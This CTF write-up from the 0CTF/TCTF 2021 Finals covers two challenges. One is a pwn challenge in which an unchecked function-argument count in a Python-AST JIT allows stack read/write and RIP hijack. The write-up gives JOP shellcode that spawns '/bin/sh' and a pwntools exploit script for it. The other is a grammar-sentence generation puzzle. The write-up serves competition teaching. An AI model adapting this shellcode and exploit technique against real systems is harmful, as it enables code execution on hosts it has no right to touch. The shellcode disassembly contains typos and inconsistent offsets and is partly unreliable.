# 0CTF/TCTF 2021 Finals

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20210925-0ctf_tctf2021finals/) of this writeup.**


 - [0CTF/TCTF 2021 Finals](#0ctftctf-2021-finals)
   - [Pwn](#pwn)
     - [secure JIT](#secure-jit)
       - [INTRO](#intro)
       - [BUG](#bug)
       - [Arbitrary read/write in stack to hijack RIP](#arbitrary-readwrite-in-stack-to-hijack-rip)
       - [JOP](#jop)
   - [Misc](#misc)
     - [how to generate](#how-to-generate)
       - [INTRO](#intro-1)
       - [Collect_cov](#collect_cov)
       - [Target](#target)
       - [Solution](#solution)


## Pwn

### secure JIT
#### INTRO
This is a challenge which use python ast module generate JIT(64 bit), however, author modified code with the origin ast module, and give us the diff result:`patch.diff`.We could find out that the challenge mmap a executable section, and put the JIT binary inside for execution.

#### BUG
After inspecting codes and several try and error, we find out that there exisit problem in the function for generate functiondef, below is the reference.

```python=
def visit_FunctionDef(self, node):
    assert self.func is None, 'nested functions not supported'
    assert node.args.vararg is None, '*args not supported'
    assert not node.args.kwonlyargs, 'keyword-only args not supported'
    assert not node.args.kwarg, 'keyword args not supported'

    self.func = node.name
    self.label_num = 1
    self.locals = {a.arg: i for i, a in enumerate(node.args.args)}
    # Find names of additional locals assigned in this function
    locals_visitor = LocalsVisitor()
    locals_visitor.visit(node)
    for name in locals_visitor.local_names:
        if name not in self.locals:
            self.locals[name] = len(self.locals) + 1
    if 'array' in locals_visitor.function_calls:
        self.locals['_array_size'] = len(self.locals) + 1
    self.globals = set(locals_visitor.global_names)
    self.break_labels = []

    # Function label and header
    self.asm.label(node.name)
    self.num_extra_locals = len(self.locals) - len(node.args.args)
    self.compile_enter(self.num_extra_locals)

    # Now compile all the statements in the function body
    for statement in node.body:
        self.visit(statement)

    if not isinstance(node.body[-1], ast.Return):
        # Function didn't have explicit return at the end,
        # compile return now (or exit for "main")
        self.compile_return(self.num_extra_locals)

    self.asm.comment('')
    self.func = None
```
In line 9, we could find out that it didn't check if the function's parameter is matched with the argument before putting parameters into `self.locals`. This would cause **arbitrary read/write in stack** when using some statement like assignment or arithmetic operation.

#### Arbitrary read/write in stack to hijack RIP
With the arbitrary read/write in stack problem we could hijack RIP now !
The code below is an example:

```python=
test()
def test():
    a = 1
    test1()

def test1(num1, num2, num3, num4, num5):
    x = 0
    x = num1
    x = num2
    x = num3
    x = num4
    x = num5
    num3+=0x10
```

we could imagine the stack diagram when execute to test1()

```
|    stack     |  <------- ...
----------------
| RIP(outside) |  <------- num3
----------------
|  0x00000001  |  <------- a, num4
----------------
| rbp(outside) |  <------- num5
----------------
|  rip(test)   |  
----------------
|  0x00000000  |  <------- x
----------------
|  rbp(test)   |
----------------
```

#### JOP
Now, we could hijack rip, so it's time to write some shellcode...
We decide to use **Assignment** to write shellcode.
So there existed a constraint that **instruction must be lower than 4 bytes**
Finally we had the following gadget.

```python=
setupJOP()

def setupJOP():
    overwriteRIP()
    a = 0x04eb5854  #push rsp;          pop rax
    a = 0x682f00c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04ebc0fe  #inc al;
    a = 0x686200c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04ebc0fe  #inc al;
    a = 0x686900c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04ebc0fe  #inc al;
    a = 0x686e00c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04ebc0fe  #inc al;
    a = 0x682f00c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04ebc0fe  #inc al;
    a = 0x687300c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04ebc0fe  #inc al;
    a = 0x686800c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04ebc0fe  #inc al;
    a = 0x680000c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04eb5f54  #push rsp;          pop rdi
    a = 0x04ebf631  #xor esi, esi
    a = 0x04ebd231  #xor edx, edx
    a = 0x04ebc031  #xor eax, eax
    a = 0x050f3bb0  #mov al, 0x3b;      syscall

def overwriteRIP(num1,num2,num3,num4,num5):
    x = num1
    x = num2
    x = num3
    x = num4
    x = num5
    num3+=0x10
```

shellcode execution flow :

```assembly=
<!-- set rax to rsp address -->
0x15: push   rsp
0x16: pop    rax
0x17: jmp    0x1d
<!-- mov '/' into rsp address -->
0x1d: mov byte[rax],0x2f
0x20: push   0x6808458f
0x25: pop    rdi
0x26: nop 
0x27: jmp    0x2d

<!-- mov 'b' into rsp address -->
0x2d: inc    al
0x2f: jmp    0x35

0x35: mov    byte[rax],0x62
0x38: push   0x6808458f
0x3d: pop    rdi
0x3e: nop
0x3f: jmp    0x45

<!-- mov 'i' into rsp address -->
0x45: inc    al
0x47: jmp    0x4d

0x4d: mov    pyte ptr [rax], 0x69 
0x50: push   0x6808458f
0x55: pop    rdi
0x56: nop
0x57: jmp 0x5d

<!-- mov 'n' into rsp address -->
0x5d: inc    al
0x5f: jmp    0x65

0x65: mov    pyte ptr [rax], 0x6e
0x68: push   0x6808458f
0x6d: pop    rdi
0x6e: nop
0x6f: jmp    0x75

<!-- mov '/' into rsp address -->
0x75: inc    al
0x77: jmp    0x7d

0x7d: mov    BYTE PTR [rax],0x2f
0x80: push   0x6808458f
0x85: pop    rdi
0x86: nop
0x87: jmp    0x8d

<!-- mov 's' into rsp address -->
0x8d: inc    al
0x8f: jmp    0x95

0x95: mov    BYTE PTR [rax],0x73
0x98: push   0x6808458f
0x9d: pop    rdi
0x9e: nop
0x9f: jmp    0xa5

<!-- mov 'h' into rsp address -->
0xa5: inc    al
0xa7: jmp    0x95

0xad: mov    BYTE PTR [rax],0x73
0xb0: push   0x6808458f
0xb5: pop    rdi
0xb6: nop
0xb7: jmp    0xbd

<!-- mov '\x00' into rsp address -->
0xa5: inc    al
0xa7: jmp    0xc5

0xad: mov    BYTE PTR [rax],0x0
0xb0: push   0x6808458f
0xb5: pop    rdi
0xb6: nop
0xb7: jmp    0xd5

<!-- pop rsp to rdi -->
0xd5: push   rsp
0xd6: pop    rdi
0xd7: jmp    0xdd

<!-- set esi to 0 -->
0xdd: xor    esi,esi
0xdf: jmp    0xe5

<!-- set edx to 0 -->
0xe5: xor    edx,edx
0xe7: jmp    0xed

<!-- set eax to 0x3b -->
0xe5: xor    eax,eax
0xe7: jmp    0xf5

0xf5: mov al, 0x3b
<!-- syscall -->
0xf7 syscall

```

Finally, exploit script:

```python=
from pwn import *

code = '''
setupJOP()

def setupJOP():
    overwriteRIP()
    a = 0x04eb5854  #push rsp;          pop rax
    a = 0x682f00c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04ebc0fe  #inc al;
    a = 0x686200c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04ebc0fe  #inc al;
    a = 0x686900c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04ebc0fe  #inc al;
    a = 0x686e00c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04ebc0fe  #inc al;
    a = 0x682f00c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04ebc0fe  #inc al;
    a = 0x687300c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04ebc0fe  #inc al;
    a = 0x686800c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04ebc0fe  #inc al;
    a = 0x680000c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04eb5f54  #push rsp;          pop rdi
    a = 0x04ebf631  #xor esi, esi
    a = 0x04ebd231  #xor edx, edx
    a = 0x04ebc031  #xor eax, eax
    a = 0x050f3bb0  #mov al, 0x3b;      syscall

def overwriteRIP(num1,num2,num3,num4,num5):
    x = num1
    x = num2
    x = num3
    x = num4
    x = num5
    num3+=0x10
'''

r = remote('127.0.0.1',40404)
r.sendlineafter('<xxx>`.\n',code+'EOF')
r.interactive()

#flag{secure_jit_again_see_you_in_2022}

```

## Misc

### how to generate

#### INTRO

This is a challenge which use python lark module to generate random grammer.
This is the code for generating grammer:

```python=
def gen_grammar():
    gram = '''%import common.LETTER
%import common.WORD
%import common.NUMBER
%import common.DIGIT
%import common.WS
%ignore WS

start: statement+

'''
    num = 0
    exprs = "expression: "
    for i in range(50):
        if i!=0:
            exprs += "    | "
        exprs += genexpr()
        exprs += "-> cov_%d" % num
        num += 1
        exprs += "\n"
    gram += exprs
    stmts = "statement: "
    for i in range(100):
        if i!= 0:
            stmts += "    | "
        stmts += genstmt()
        stmts += "-> cov_%d" % num
        num += 1
        stmts += "\n"
    gram += stmts
    return gram
```

genexpr() generate grammer of expression
EX:

```
LETTER "+" WORD "%" DIGIT -> cov_0
WORD "@" LETTER "%" LETTER "-" DIGIT -> cov_1
NUMBER "@" WORD "*" WORD -> cov_2
```

genstmt() generate grammer of statement
EX:

```
"OBzXJ4" expression statement "pEe" expression "Iowp1L" NUMBER WORD -> cov_51
"OwO" expression "dvL6" LETTER "Vr0czr" expression "dsnwh9" DIGIT "hNeOhJ" -> cov_52
"Vqg" statement "1rAxJM" expression "y8ek4" expression "LVdgiw" expression -> cov_53
```

So we need to generate sentences which map the given grammer.

#### Collect_cov
After we generate valid sentence, it will record the "rule's layer" we use.

```python=
def collect_cov(ast):
    cov = 0
    if isinstance(ast, lark.tree.Tree):
        for ch in ast.children:
            cov |= collect_cov(ch)
        if ast.data.startswith('cov_'):
            num = int(ast.data[4:])
            cov |= (1<<num)
    return cov
```

#### Target
We need to match these goals.
- Generate 4096 valid sentences
- Each sentence should match more than 20 rules
- Each sentence's `cov` should not be same
- Union all the sentence, we should use all the rules.

#### Solution

```python=
from pwn import *
import random
import zlib
random.seed (1000)

'''
- rules are store in _dict

- _dict:
  { cov_num : {'sentence': string, 'stateCnt': number, 'expCnt': number} }

- sentence : if exist statement, replace it as 's'
             if exist expression, replace it as 'e'
             if exist LETTER, replace it as 'a'
             if exist WORD, replace it as 'b'
             if exist NUMBER, replace it as '1'
             if exist DIGIT, replace it as '2'
'''

_dict = {}
MAX_DEPTH = 20
exp_0_cnt = 0
st_0_cnt = 0

import hashlib
import itertools
import multiprocessing as mp
import string
import sys

charset = (string.ascii_letters + string.digits).encode()

def worker(args):
    prefix, _posfix, _hash = args
    for x in itertools.product(charset, repeat=3):
        x = bytes((prefix,)+x)
        if _hash == hashlib.sha256(x+_posfix).hexdigest():
            return x, True
    return None, False

def solve_sha256(m):
    _hash = m.decode('latin-1').strip('\n').split(' ')[-1]
    _posfix = m.strip(b'\n').split(b' ')[0][12:-1]
    print(_hash, _posfix)

    candidates = [(e, _posfix, _hash) for e in charset]
    with mp.Pool(10) as pool:
        for x, ok in pool.imap_unordered(worker, candidates):
            if ok:
                return x.decode()

def parse_rule(_dict, m):
    def parse_statement(_dict, lines):
        for line in lines:
            line = line.replace('\"','')
            sentence = ''
            e_cnt = 0
            s_cnt = 0
            tokens = line.split(' ')
            for token in tokens:
                if token == 'LETTER':
                    sentence += 'a '
                elif token == 'WORD':
                    sentence += 'b '
                elif token == 'NUMBER':
                    sentence += '1 '
                elif token == 'DIGIT':
                    sentence += '2 '
                elif token == 'expression':
                    sentence += 'e '
                    e_cnt += 1
                elif token == 'statement':
                    sentence += 's '
                    s_cnt += 1
                elif token == 'statement:':
                    continue
                elif 'cov' in token:
                    number = int(token[4:])
                elif len(token) > 2:
                    sentence += token + ' '
            _dict[number] = {'sentence': sentence, 'stateCnt': s_cnt, 'expCnt': e_cnt}
        return _dict    

    def parse_expession(_dict, lines):
        for line in lines:
            line = line.replace('\"','')
            sentence = ''
            cnt = 0
            tokens = line.split(' ')
            for token in tokens:
                if token == 'LETTER':
                    sentence += 'a'
                elif token == 'WORD':
                    sentence += 'b'
                elif token == 'NUMBER':
                    sentence += '1'
                elif token == 'DIGIT':
                    sentence += '2'
                elif token == 'expression':
                    sentence += 'e'
                    cnt += 1
                elif token in "!@#$%^&*-+~":
                    sentence += token
                elif 'cov' in token:
                    number = int(token[4:])
            sentence = ' '.join(sentence)
            _dict[number] = {'sentence': sentence, 'stateCnt': 0, 'expCnt': cnt}
        
        return _dict  
    
    lines = m.split('\n')
    _dict = parse_expession(_dict, lines[10:60])
    _dict = parse_statement(_dict, lines[60:160]) 
    return _dict  

def solve(_dict):
    global exp_0_cnt, st_0_cnt
    tot = 0
    ans = []
    record = set()
    big_record = set()
    exp_0 = []
    st_0 = []
    def add_statement(s, _dict, tot, ans, depth):
        # pause()
        global exp_0_cnt
        global st_0_cnt
        depth += 1
        tot += s['stateCnt'] + s['expCnt']
        ans = ans.replace(' s ', ' ' + s['sentence'] + ' ', 1)
        # print(ans)
        for i in range(s['stateCnt']):
            if(tot > 20) or (depth >= MAX_DEPTH):
                # print(st_0_cnt)
                record.add(st_0_cnt)
                ans, tot = add_statement(_dict[st_0_cnt], _dict, tot, ans, depth)                
                st_0_cnt = random.choice(st_0)
            else:
                num = random.randint(51, 149)
                # print(num)
                record.add(num)
                ans, tot = add_statement(_dict[num], _dict, tot, ans, depth)

        for i in range(s['expCnt']):
            if(tot > 20) or (depth >= MAX_DEPTH):
                # print(exp_0_cnt)
                record.add(exp_0_cnt)
                ans, tot = add_expression(_dict[exp_0_cnt], _dict, tot, ans, depth)
                exp_0_cnt = random.choice(exp_0)
            else:
                num = random.randint(0, 49)
                # print(num)
                record.add(num)
                ans, tot = add_expression(_dict[num], _dict, tot, ans, depth)
        return ans, tot

    def add_expression(s, _dict, tot, ans, depth):
        # pause()
        global exp_0_cnt
        depth += 1
        tot += s['expCnt']
        ans = ans.replace(' e ', ' ' + s['sentence'] + ' ', 1)
        # print(ans)
        for i in range(s['expCnt']):
            if(tot > 20) or (depth >= MAX_DEPTH):
                # print(exp_0_cnt)    
                record.add(exp_0_cnt)
                ans, tot = add_expression(_dict[exp_0_cnt], _dict, tot, ans, depth)
                exp_0_cnt = random.choice(exp_0)
            else:
                num = random.randint(0, 49)
                # print(num)
                record.add(num)
                ans, tot = add_expression(_dict[num],_dict, tot, ans, depth)
        return ans, tot

    def findUsefulstatement(_dict, ans):
        for el in ans:
            for i in range(50, 150):
                if _dict[i]['stateCnt'] == 0 and _dict[i]['expCnt'] == 0:
                    if _dict[i]['sentence'] in el:
                        return i, el
        return None, None
    
    def findUsefulexpression(_dict, ans):
        for el in ans:
            for i in range(50):
                if _dict[i]['stateCnt'] == 0 and _dict[i]['expCnt'] == 0:
                    if _dict[i]['sentence'] in el:
                        return i, el
        return None, None
    # Find out expression which doesn't has any expression inside.
    for i in range(50):
        if _dict[i]['expCnt'] == 0 :
            exp_0.append(i)
    # Find out statement which doesn't has any statement or expression inside.
    for i in range(50, 150):
        if _dict[i]['expCnt'] == 0 and _dict[i]['stateCnt'] == 0 :
            st_0.append(i)

    table = []
    record = set()
    tot = 0
    # get random valid sentence
    for i in range((4096 - 150)):
        record = set()
        tot = 0
        while len(record) < 20:
            record = set()
            tot = 0
            sentence, tot = add_statement(_dict[random.randint(50,149)], _dict, 0, ' s ', 0)
            if (' e' in sentence) or (' s' in sentence):
                tot = 0
                record = set()
            elif  record in table:
                tot = 0
                record = set()
        table.append(record)
        big_record = big_record.union(record)
        ans.append(sentence[1:])
    # check how many con_num have we get.
    print(len(big_record))
    # get miss list
    miss = []
    for i in range(150):
        if (i not in big_record):
            miss.append(i)
    # print out miss list
    for el in miss:
        print(el, _dict[el]['stateCnt'], _dict[el]['expCnt'])
    # find useful statement and useful expression for patching
    usefulstIdx, usefulstSentence = findUsefulstatement(_dict, ans)
    usefulexpIdx, usefulexpSentence = findUsefulexpression(_dict, ans)
    # patch
    for el in miss:
        if el > 49:
            target_sentence = usefulstSentence.replace(' ' + _dict[usefulstIdx]['sentence'] + ' ', ' ' + _dict[el]['sentence'] + ' ', 1)
            for i in range(_dict[el]['stateCnt']):
                target_sentence = target_sentence.replace(' s ', ' ' + _dict[usefulstIdx]['sentence'] + ' ', 1)
            for i in range(_dict[el]['expCnt']):
                target_sentence = target_sentence.replace(' e ', ' ' + _dict[usefulexpIdx]['sentence'] + ' ', 1)
            ans.append(target_sentence)
        else:
            target_sentence = usefulexpSentence.replace(' ' + _dict[usefulexpIdx]['sentence'] + ' ', ' ' + _dict[el]['sentence'] + ' ', 1)
            for i in range(_dict[el]['expCnt']):
                target_sentence = target_sentence.replace(' e ', ' ' + _dict[usefulexpIdx]['sentence'] + ' ', 1)
            ans.append(target_sentence)
    # use random to generate least sentence
    for i in range((150 - len(miss))):
        record = set()
        tot = 0
        while len(record) < 20:
            record = set()
            tot = 0
            sentence, tot = add_statement(_dict[random.randint(50,149)], _dict, 0, ' s ', 0)
            if (' e' in sentence) or (' s' in sentence):
                tot = 0
                record = set()
            elif  record in table:
                tot = 0
                record = set()
        table.append(record)
        big_record = big_record.union(record)
        ans.append(sentence[1:])

    return ans
    
if __name__ == "__main__":
    y = remote('121.5.253.92',10001)
    msg = y.recvline()
    # solve sha256
    answer = solve_sha256(msg)
    y.sendlineafter('XXXX:', answer)
    msg = y.recvuntil('EOF')
    # parse rule to _dict
    _dict = parse_rule(_dict, msg.decode('latin-1'))
    # solving...
    ans = solve(_dict)
    # change ans to remote format
    ans = b'|'.join([el.encode('latin-1') for el in ans])
    ans = zlib.compress(ans)
    length = len(ans)
    ans = ans.hex()
    ans = ans.encode('latin-1')
    y.sendlineafter('size: ', str(length))
    y.sendlineafter('code(hex): ', ans)
    y.interactive()
    
    # flag{Di3_G7enzen_mEiNer_5prache_beDeuTeN_dIe_GrenzEn_meinEr_Welt}
```
